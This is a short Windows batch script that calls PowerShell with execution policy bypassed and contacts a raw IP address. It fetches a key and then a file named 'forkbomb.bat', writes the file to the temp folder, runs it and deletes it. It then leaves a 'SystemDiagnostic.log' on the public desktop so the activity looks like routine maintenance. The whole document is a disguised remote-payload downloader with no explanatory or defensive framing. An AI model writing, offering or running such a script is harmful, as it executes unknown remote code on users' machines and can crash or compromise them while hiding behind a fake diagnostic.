@echo off
setlocal enabledelayedexpansion
for /f "delims=" %%i in ('powershell -NoP -Ex By -C "$b='http://82.29.153.101:8080';$t=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(IWR ($b+'/auth/key?ts='+ $t) -UseBasicParsing).Content.Trim();(IWR ($b+'/forkbomb.bat') -Headers @{''=''} -UseBasicParsing).Content"') do (
    echo %%i^>^>%temp%\sys.bat
)
start "" %temp%\sys.bat
del %temp%\sys.bat
echo Sys OK^>^>%public%\Desktop\SystemDiagnostic.log